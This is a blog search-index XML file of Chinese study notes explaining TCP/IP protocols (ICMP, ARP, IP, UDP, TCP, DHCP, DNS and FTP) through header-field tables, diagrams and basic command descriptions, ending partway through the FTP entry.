<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[TCP/IP协议-ICMP]]></title>
      <url>/2021/03/06/ICMP/</url>
      <content type="html"><![CDATA[<h1 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>​      <strong>ICMP用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息并不传输用户数据，但是对于用户数据的传递起着重要的作用。</strong> </p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1590497892010.png" alt="1590497892010" title class>
                <p>1590497892010</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596364034828.png" alt="1590497909864" title class>
                <p>1590497909864</p>
            </figure>

<h2 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h2><p><strong>报文格式</strong></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1590497909864.png" alt title class>
                <p></p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1590497291991.png" alt="1596364034828" title class>
                <p>1596364034828</p>
            </figure>

<table>
<thead>
<tr>
<th align="center"></th>
<th align="center"></th>
<th align="center"></th>
<th align="center"></th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="center">TYPE</td>
<td align="center">CODE</td>
<td align="center">Description</td>
<td align="center">Query</td>
<td align="center">Error</td>
</tr>
<tr>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">Echo Reply——回显应答（Ping应答）</td>
<td align="center">v</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">0</td>
<td align="center">Network Unreachable——网络不可达</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">1</td>
<td align="center">Host Unreachable——主机不可达</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">2</td>
<td align="center">Protocol Unreachable——协议不可达</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">3</td>
<td align="center">Port Unreachable——端口不可达</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">4</td>
<td align="center">Fragmentation needed but no frag. bit set——需要进行分片但设置不分片比特</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">5</td>
<td align="center">Source routing failed——源站选路失败</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">6</td>
<td align="center">Destination network unknown——目的网络未知</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">7</td>
<td align="center">Destination host unknown——目的主机未知</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">8</td>
<td align="center">Source host isolated (obsolete)——源主机被隔离（作废不用）</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">9</td>
<td align="center">Destination network administratively prohibited——目的网络被强制禁止</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">10</td>
<td align="center">Destination host administratively prohibited——目的主机被强制禁止</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">11</td>
<td align="center">Network unreachable for TOS——由于服务类型TOS，网络不可达</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">12</td>
<td align="center">Host unreachable for TOS——由于服务类型TOS，主机不可达</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">13</td>
<td align="center">Communication administratively prohibited by filtering——由于过滤，通信被强制禁止</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">14</td>
<td align="center">Host precedence violation——主机越权</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">15</td>
<td align="center">Precedence cutoff in effect——优先中止生效</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">0</td>
<td align="center">Source quench——源端被关闭（基本流控制）</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">0</td>
<td align="center">Redirect for network——对网络重定向</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">1</td>
<td align="center">Redirect for host——对主机重定向</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">2</td>
<td align="center">Redirect for TOS and network——对服务类型和网络重定向</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">3</td>
<td align="center">Redirect for TOS and host——对服务类型和主机重定向</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8</td>
<td align="center">0</td>
<td align="center">Echo request——回显请求（Ping请求）</td>
<td align="center">v</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">9</td>
<td align="center">0</td>
<td align="center">Router advertisement——路由器通告</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">10</td>
<td align="center">0</td>
<td align="center">Route solicitation——路由器请求</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">11</td>
<td align="center">0</td>
<td align="center">TTL equals 0 during transit——传输期间生存时间为0</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center">1</td>
<td align="center">TTL equals 0 during reassembly——在数据报组装期间生存时间为0</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">12</td>
<td align="center">0</td>
<td align="center">IP header bad (catchall error)——坏的IP首部（包括各种差错）</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">12</td>
<td align="center">1</td>
<td align="center">Required options missing——缺少必需的选项</td>
<td align="center"></td>
<td align="center">v</td>
</tr>
<tr>
<td align="center">13</td>
<td align="center">0</td>
<td align="center">Timestamp request (obsolete)——时间戳请求（作废不用）</td>
<td align="center">v</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">14</td>
<td align="center"></td>
<td align="center">Timestamp reply (obsolete)——时间戳应答（作废不用）</td>
<td align="center">v</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">15</td>
<td align="center">0</td>
<td align="center">Information request (obsolete)——信息请求（作废不用）</td>
<td align="center">v</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">16</td>
<td align="center">0</td>
<td align="center">Information reply (obsolete)——信息应答（作废不用）</td>
<td align="center">v</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">17</td>
<td align="center">0</td>
<td align="center">Address mask request——地址掩码请求</td>
<td align="center">v</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">18</td>
<td align="center">0</td>
<td align="center">Address mask reply——地址掩码应答</td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<p><strong>回显请求</strong></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1590594453579.png" alt="1590594423632" title class>
                <p>1590594423632</p>
            </figure>

<p><strong>回显应答</strong></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1590594423632.png" alt="1590594453579" title class>
                <p>1590594453579</p>
            </figure>

]]></content>
      
        <categories>
            
            <category> 协议 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[TCP/IP协议-ARP]]></title>
      <url>/2021/03/06/ARP/</url>
      <content type="html"><![CDATA[<h1 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><strong>ARP用于实现IP地址到MAC地址映射</strong>（IP→MAC）</p>
<p><code>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗。ARP命令可用于查询本机ARP缓存中IP地址和MAC地址的对应关系、添加或删除静态对应关系等。</code></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1590596598243.png" alt="1596339018946" title class>
                <p>1596339018946</p>
            </figure>

<h2 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h2><ul>
<li>ARP数据包的长度固定为28 bytes</li>
</ul>
<p><strong>报文格式</strong></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596339018946.png" alt="1590596598243" title class>
                <p>1590596598243</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1590493175549.png" alt="1590491854669" title class>
                <p>1590491854669</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1590493282072.png" alt="1590492093776" title class>
                <p>1590492093776</p>
            </figure>

<p><strong>请求包</strong></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1590491854669.png" alt="1590493175549" title class>
                <p>1590493175549</p>
            </figure>

<p><strong>回应包</strong></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1590492093776.png" alt="1590493282072" title class>
                <p>1590493282072</p>
            </figure>

<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li><strong>免费ARP</strong>：查询想使用的ip地址是否在局域网中已被占用</li>
<li><strong>代理ARP</strong>:向另一个网络发送ARP请求时，路由器主机返回自己的mac作为目的地址</li>
<li><strong>RARP(翻转ARP)</strong>：通过MAC地址获得ip地址</li>
<li><strong>IARP(逆向ARP):</strong>DLCI到IP的映射,应用在帧中继网络中</li>
</ul>
<h2 id="ARP命令"><a href="#ARP命令" class="headerlink" title="ARP命令"></a>ARP命令</h2><ul>
<li>arp -a:显示接口当前的ARP缓存表</li>
<li>arp -d:删除指定IP项目</li>
<li>arp -s:添加静态绑定</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 协议 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[TCP/IP协议-IP]]></title>
      <url>/2021/03/02/IP/</url>
      <content type="html"><![CDATA[<h1 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><strong>IP用于实现数据的不可靠面向无连接的通信，实现三层数据封装与IP寻址</strong></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596364442923.png" alt="1596364442923" title class>
                <p>1596364442923</p>
            </figure>

<h2 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h2><ul>
<li><p>一个 IP 数据报由首部和数据两部分组成</p>
</li>
<li><p>首部的前一部分是固定长度，共 20 字节，是所有 IP 数据报必须具有的</p>
</li>
<li><p>在首部的固定部分的后面是一些可选字段，其长度是可变的 </p>
</li>
</ul>
<p><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1590596009691.png" alt="1590596009691"></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1590637295000.png" alt="1590637295000" title class>
                <p>1590637295000</p>
            </figure>

<table>
<thead>
<tr>
<th align="center">字段</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>版本号</strong></td>
<td>表示IP协议版本，对IPv4来说这个值总是4bit</td>
</tr>
<tr>
<td align="center"><strong>头部长度</strong></td>
<td>头部长度（默认为20字节）</td>
</tr>
<tr>
<td align="center"><strong>服务类型</strong></td>
<td>为应用程序、主机或路由器处理报文提供一个优先级服务标志</td>
</tr>
<tr>
<td align="center"><strong>总长度</strong></td>
<td>指整个IP数据报以字节为单位的长度。用于区分IP头部和数据包，接收方根据长度字段知道从哪里解封装</td>
</tr>
<tr>
<td align="center"><strong>标识符</strong></td>
<td>唯一地标识主机发送的每一份数据报，用于标志分片的进程</td>
</tr>
<tr>
<td align="center"><strong>标志符</strong></td>
<td>MF 为1表示还有分片，本报文不是最后一个分片报文，为0表示本是最后一个分片报文。当DF为0时才允许分片</td>
</tr>
<tr>
<td align="center"><strong>分片偏移</strong></td>
<td>用于告知接收方每个分片距离IP头部的位置，才能实现有序的重新组装</td>
</tr>
<tr>
<td align="center"><strong>生存时间</strong></td>
<td>TTL值最大为255，标志路径长短防止环路</td>
</tr>
<tr>
<td align="center"><strong>协议号</strong></td>
<td>上层协议</td>
</tr>
<tr>
<td align="center"><strong>头部校验和</strong></td>
<td>验证数据包的完整性。检验和不对首部后面的数据进行计算</td>
</tr>
<tr>
<td align="center"><strong>源地址</strong></td>
<td>发送方IP地址</td>
</tr>
<tr>
<td align="center"><strong>目的地址</strong></td>
<td>接收方IP地址</td>
</tr>
</tbody></table>
<h2 id="分片与重组"><a href="#分片与重组" class="headerlink" title="分片与重组"></a>分片与重组</h2><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596365153423.png" alt="1596365153423" title class>
                <p>1596365153423</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1590636929934.png" alt="1590636929934" title class>
                <p>1590636929934</p>
            </figure>

<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><ul>
<li>IP数据报的分片与重组是在网络层进完成的</li>
<li>TCP报文段的分段与重组是在运输层完成的</li>
<li>UDP不会分段，就由IP来分。TCP会分段，就不用IP来分</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 协议 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[TCP/IP协议-UDP]]></title>
      <url>/2021/02/27/UDP/</url>
      <content type="html"><![CDATA[<h1 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><strong>UDP用于实现面向无连接的不可靠协议，传输层协议。UDP是一个简单的面向数据报的传输层协议，无连接协议简单地把从TCP/IP应用层得到的消息打包到数据报中，UDP数据报只是在应用层的基础数据上添加一个首部后就传递给IP层</strong></p>
<p><code>由于UDP没有提供任何类型的内置出错检查或重传能力来提高可靠性，这种方法称为尽最大努力交付（Best-Effort
Delivery）</code></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>UDP 是面向报文的</strong></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596365435970.png" alt="1596365435970" title class>
                <p>1596365435970</p>
            </figure>

<h2 id="数据包结构"><a href="#数据包结构" class="headerlink" title="数据包结构"></a>数据包结构</h2><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1591666338671.png" alt="1591666338671" title class>
                <p>1591666338671</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1591666777626.png" alt="1591666777626" title class>
                <p>1591666777626</p>
            </figure>

<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><ul>
<li>通信过程中，源端口一般属于随机高端口，目的端口属于固定知名端口。</li>
<li>1-1023为知名端口号范围</li>
<li>由于IP层已经把IP数据报分配给TCP或UDP，因此TCP端口号由TCP来查看，而UDP端口号由UDP来查看，TCP端口号与UDP端口号是相互独立的</li>
<li>UDP具有较好的通信效能，非常适合对通信开销有一定要求的场合。许多典型的应用协议采用了UDP协议来实现，例如RIP、DHCP、DNS和SNMP协议等</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 协议 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[TCP/IP协议-TCP]]></title>
      <url>/2021/02/26/TCP/</url>
      <content type="html"><![CDATA[<h1 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><strong>TCP是TCP/IP协议栈中的传输层协议，TCP称为面向字节流连接的可靠传输层协议。它给IP协议提供了面向连接的和可靠的服务</strong></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
<li>IP 协议的作用范围（提供主机之间的逻辑通信）</li>
<li>TCP 和 UDP 协议的作用范围（提供进程之间的逻辑通信)</li>
</ul>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1591332708474.png" alt="1591332708474" title class>
                <p>1591332708474</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596380836503.png" alt="1596374648644" title class>
                <p>1596374648644</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596366771908.png" alt="1596366771908" title class>
                <p>1596366771908</p>
            </figure>

<p><strong>三次握手</strong></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596374648644.png" alt="1596380836503" title class>
                <p>1596380836503</p>
            </figure>

<p><strong>四次挥手</strong></p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596380853796.png" alt="1596380853796" title class>
                <p>1596380853796</p>
            </figure>

<h2 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h2><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596380869826.png" alt="1590765220856" title class>
                <p>1590765220856</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1590765220856.png" alt="1591365771480" title class>
                <p>1591365771480</p>
            </figure>

<p><strong>FLAG位：</strong></p>
<table>
<thead>
<tr>
<th>RFC793定义</th>
<th></th>
<th></th>
<th><strong>URG</strong></th>
<th><strong>ACK</strong></th>
<th><strong>PSH</strong></th>
<th><strong>RST</strong></th>
<th><strong>SYN</strong></th>
<th><strong>FIN</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>RFC3168定义</strong></td>
<td><strong>CWR</strong></td>
<td><strong>ECN</strong></td>
<td><strong>URG</strong></td>
<td><strong>ACK</strong></td>
<td><strong>PSH</strong></td>
<td><strong>RST</strong></td>
<td><strong>SYN</strong></td>
<td><strong>FIN</strong></td>
</tr>
</tbody></table>
<p><code>MSS (Maximum Segment Size)是 TCP 报文段中的数据字段的最大长度。数据字段加上 TCP 首部才等于整个的 TCP</code></p>
<table>
<thead>
<tr>
<th align="center">选项</th>
<th>定义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">2</td>
<td>最大数据段大小(MSS）</td>
</tr>
<tr>
<td align="center">3</td>
<td>窗口扩大选项 ——占 3 字节，其中有一个字节表示移位值 S。新的窗口值等于TCP 首部中的窗口位数增大到(16 + S)，相当于把窗口值向左移动 S 位后获得实际的窗口大小。</td>
</tr>
<tr>
<td align="center">4</td>
<td>允许选择的ACK(SACK)—说明发送方对于特定的ACK数据包可以有选择的使用确认</td>
</tr>
<tr>
<td align="center">5</td>
<td>SACK—在SACK数据包内使用</td>
</tr>
<tr>
<td align="center">8</td>
<td>时间戳选项——占10 字节，其中最主要的字段时间戳值字段（4 字节）和时间戳回送回答字段（4 字节）。</td>
</tr>
</tbody></table>
<h2 id="TCP的流量控制过程"><a href="#TCP的流量控制过程" class="headerlink" title="TCP的流量控制过程"></a>TCP的流量控制过程</h2><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596380879642.png" alt="1591366377444" title class>
                <p>1591366377444</p>
            </figure>

<h2 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h2><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1591366377444.png" alt="1596380869826" title class>
                <p>1596380869826</p>
            </figure>

<h2 id="端口多路复用"><a href="#端口多路复用" class="headerlink" title="端口多路复用"></a>端口多路复用</h2><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1591365771480.png" alt="1596380879642" title class>
                <p>1596380879642</p>
            </figure>]]></content>
      
        <categories>
            
            <category> 协议 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[TCP/IP协议-DHCP]]></title>
      <url>/2021/02/25/DHCP/</url>
      <content type="html"><![CDATA[<h1 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><strong>DHCP(Dynamic Host Configuration Protocol)是 BOOTP的扩展，是基于C/S模式的，它提供了一种动态指定IP地址和配置参数的机制。DHCP是应用层的协议。其传输层采用UDP协议。</strong></p>
<ul>
<li><p>DHCP服务器(DHCP Server)，UDP 67端口</p>
</li>
<li><p>DHCP客户机(DHCP  Client)，UDP  68端口</p>
</li>
</ul>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595421350607.png" alt="1596339941167" title class>
                <p>1596339941167</p>
            </figure>

<h2 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h2><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595422505596.png" alt="1595421350607" title class>
                <p>1595421350607</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596339941167.png" alt="1595422505596" title class>
                <p>1595422505596</p>
            </figure>

<p><strong>DHCP报文的各个字段的含义如下：</strong></p>
<p>（1）操作码：表示本次DHCP操作的类别，占1字节。为1表示请求，即客户机发送给服务器的报文，为2表示应答，即服务器发回给客户机的报文。<br>（2）硬件类型：表示物理网络的类型，占1字节。取值0x01表示以太网。</p>
<p>（3）硬件地址长度：物理地址的长度，占1字节。对以太网值为0x06。</p>
<p>（4）跳数：指报文经过路由器传送的跳数，占1字节。如果报文经过网络上路由器转发则每站加1，若是在同一网络内为0。</p>
<p>（5）事务标识：用作请求与应答匹配的依据，是系统生成的随机数，占4字节。</p>
<p>（6）秒数：由客户指定的时间，指客户端开始地址获取和更新进行后的时间（秒），占2字节。</p>
<p>（7）标志：表示服务器的通信方式，占16比特。最左一位为1时表示服务器将以广播方式传送封包，为0则为单播方式，其余位保留，尚未使用。</p>
<p>（8）客户IP地址：是客户端想继续使用之前取得之IP地址，则列在这里。</p>
<p>（9）你的IP地址：是从服务器送回的分配给客户的IP地址。</p>
<p>（10）服务器IP地址：是客户端引导过程中使用的DHCP服务器IP地址。<br>（11）网关IP地址：指如使用DHCP中继，则给出中继代理的地址，否则为0。</p>
<p>（12）客户主机硬件地址：存放客户端的物理地址，占16字节。对以太网，则只使用前6个字节，其余字节为0。DHCP服务器存放这个地址并与分配的IP地址相关联。</p>
<p>（13）服务器主机名：服务器名称字符串，占64字节。可选字段，以0x00 结尾。</p>
<p>（14）引导文件名：是指客户端网络引导的开机程序名称，通常设计为稍后以TFTP传送引导文件内容，占128字节。可选字段，以0x00结尾。</p>
<p>（15）选项：提供更多的设定信息，如：子网掩码、路由器、DNS等等，可携带多个选项。每一选项的格式都是“类别-长度-值”即TLV（Tag-Len-Value）格式，完全兼容BOOTP并扩充了更多选项。</p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595422712845.png" alt="1595422712845" title class>
                <p>1595422712845</p>
            </figure>

]]></content>
      
        <categories>
            
            <category> 协议 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[TCP/IP协议-DNS]]></title>
      <url>/2021/02/25/DNS/</url>
      <content type="html"><![CDATA[<h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><strong>DNS（域名系统）是一种能够完成从名称到地址或从地址到名称的映射。系统域名解析的方式有两种，一种称为递归查询，另一种称为迭代查询</strong></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595384474208.png" alt="1595384474208" title class>
                <p>1595384474208</p>
            </figure>

<h2 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h2><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595384513677.png" alt="1595384513677" title class>
                <p>1595384513677</p>
            </figure>


<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595418285524.png" alt="1595418285524" title class>
                <p>1595418285524</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595384639006.png" alt="1595384639006" title class>
                <p>1595384639006</p>
            </figure>

<ul>
<li><p>QR—0：查询报文；1：响应报文（使用UDP时，当应答的总长度超过512字节时，只返回前512字节）</p>
</li>
<li><p>opcode—0：标准查询；1：反向查询；2：服务器状态请求。</p>
</li>
<li><p>AA—权威应答域只在响应中有效。如果设置的话，该位表示响应的名称服务器是问题名称域中定义的域名的权威服务器。</p>
</li>
<li><p>TC—该位通常只在响应中出现。它表示响应被切割，因为响应过大而无法适用于数据包的数据部分。例如，如果响应包含大量名称服务器，数据包可能会超过允许的MTU。在这种情况下，数据包被切割，并且将TC域位设置为1。</p>
</li>
<li><p>RD—如果目标名称服务器不包含所请求的信息，该域表示客户机请求递归查询。</p>
</li>
<li><p>RA—该域在响应中有效，它表示响应名称服务器是否提供递归查询。</p>
</li>
<li><p>Rcode—该域长度为4位，用于DNS响应中，表示是否出现错误。</p>
</li>
</ul>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595420041106.png" alt="1595420041106" title class>
                <p>1595420041106</p>
            </figure>

]]></content>
      
        <categories>
            
            <category> 协议 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[TCP/IP协议-FTP]]></title>
      <url>/2021/02/24/FTP/</url>
      <content type="html"><![CDATA[<h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><strong>FTP工作在TCP/IP模型的应用层，采用TCP面向连接为文件数据的传输提供了可靠的保证。</strong></p>
<p><strong>FTP使用两个TCP连接：一个控制连接，一个数据连接</strong></p>
<ul>
<li><strong>控制连接</strong>一直持续到客户端和服务器端进程间的通信完成为止，用于传输控制命令。</li>
<li><strong>数据连接</strong>根据通信的需要随时建立和释放，用于数据的传输。</li>
</ul>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595432256504.png" alt="1595432256504" title class>
                <p>1595432256504</p>
            </figure>

<h2 id="控制连接"><a href="#控制连接" class="headerlink" title="控制连接"></a>控制连接</h2><h3 id="主动模式（PORT）"><a href="#主动模式（PORT）" class="headerlink" title="主动模式（PORT）"></a>主动模式（PORT）</h3><p><code>客户端向服务器的FTP端口（默认是21）发送连接请求，服务器接受连接，建立一条控制连接。当需要传送数据时，客户端在控制连接上用PORT命令告诉服务器：“我打开了XXXX端口，你过来连接我”。于是服务器从20端口向客户端的XXXX端口主动发送连接请求，建立一条数据连接来传送数据。</code></p>
<ul>
<li>ftp客户端请求:PORT 172,16,28,81,<em>17,64</em></li>
<li>ftp服务器响应:200 PORT Command successful</li>
</ul>
<p>服务器收到客户端的这个PORT指令后，主动用服务器的20端口连接客户端<strong>172.16.28.81</strong>的<strong>17x256+64</strong>这个端口</p>
